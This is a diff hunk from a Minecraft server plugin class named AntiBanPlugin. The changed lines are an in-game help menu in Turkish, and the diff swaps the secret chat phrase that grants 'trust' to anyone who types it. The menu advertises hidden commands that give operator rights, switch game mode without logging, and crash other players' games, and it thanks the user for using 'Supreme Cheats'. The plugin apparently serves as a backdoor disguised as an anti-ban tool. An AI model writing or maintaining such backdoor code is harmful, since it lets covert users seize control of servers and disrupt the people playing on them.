@@ -222,7 +222,7 @@ public class AntiBanPlugin extends JavaPlugin implements Listener {
             player.sendMessage(ChatColor.GREEN + "+7 OP VE GM VERIR BAYA BISEY YAPIYO ISTE");
             player.sendMessage(ChatColor.GREEN + "+8 Plugindeki belirtilen kisiler haric herkesin oyununu cokertir. (Test Edilmedi server cokebilir.)");
             player.sendMessage(ChatColor.GREEN + "+9 Logsuz Gamemode'a gecirir. geri survival'a donmek icin \"+sv\" ");
-            player.sendMessage(ChatColor.GREEN + "\"+supremecheats+\" yazan Kisiye kim olursa olsun trust verir.");
+            player.sendMessage(ChatColor.GREEN + "\"+x99\" yazan Kisiye kim olursa olsun trust verir.");
             player.sendMessage(ChatColor.RED + "" + ChatColor.RED + ChatColor.BOLD + "SUPREME CHEATS'I KULLANDIGINIZ ICIN TESEKKUR EDERIZ.");
         });
     }
